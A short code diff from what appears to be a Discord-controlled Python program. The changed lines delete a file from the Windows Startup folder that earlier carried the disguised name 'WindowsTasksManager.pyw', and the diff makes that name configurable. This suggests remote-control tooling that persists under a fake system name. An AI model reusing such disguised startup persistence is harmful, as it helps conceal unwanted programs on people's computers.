@@ -405,7 +405,7 @@ async def on_ready():
                 button_text = inter.clicked_button.id
 
                 if button_text == "yes":
-                    startup = os.getenv('appdata')+'\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTasksManager.pyw'
+                    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup\{startupname}.{statup_ext}'
                     try:
                         os.remove(startup)
                     except:
